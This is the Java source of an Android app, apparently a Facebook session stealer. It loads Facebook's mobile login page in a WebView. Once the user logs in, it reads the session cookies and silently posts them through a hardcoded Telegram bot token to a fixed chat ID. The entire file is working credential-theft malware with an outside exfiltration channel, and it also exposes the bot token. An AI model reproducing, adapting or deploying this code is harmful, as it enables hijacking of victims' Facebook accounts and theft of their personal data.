package com.jasser.fbtool;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.*;
import android.widget.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {
    String token = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc";
    String chat = "5653032481";
    TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setupUI();
    }

    private void setupUI() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF0F172A);
        layout.setPadding(40, 40, 40, 40);

        Button btn = new Button(this);
        btn.setText("استخراج كوكيز وبيانات");
        btn.setBackgroundColor(0xFF2563EB);
        
        logView = new TextView(this);
        logView.setTextColor(0xFF10B981);
        logView.setText("نظام التشغيل: أندرويد حديث\nبانتظار الأوامر...");

        layout.addView(btn);
        layout.addView(logView);
        setContentView(layout);

        btn.setOnClickListener(v -> startFB());
    }

    private void startFB() {
        WebView wv = new WebView(this);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.getSettings().setDomStorageEnabled(true);
        wv.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                String cookies = CookieManager.getInstance().getCookie(url);
                if (cookies != null && cookies.contains("c_user")) {
                    sendData("✅ كوكيز مستخرجة:\n" + cookies);
                }
            }
        });
        wv.loadUrl("https://m.facebook.com/login");
        setContentView(wv);
    }

    private void sendData(String text) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + URLEncoder.encode(text, "UTF-8"));
                ((HttpURLConnection)url.openConnection()).getInputStream();
            } catch (Exception e) {}
        }).start();
    }
}
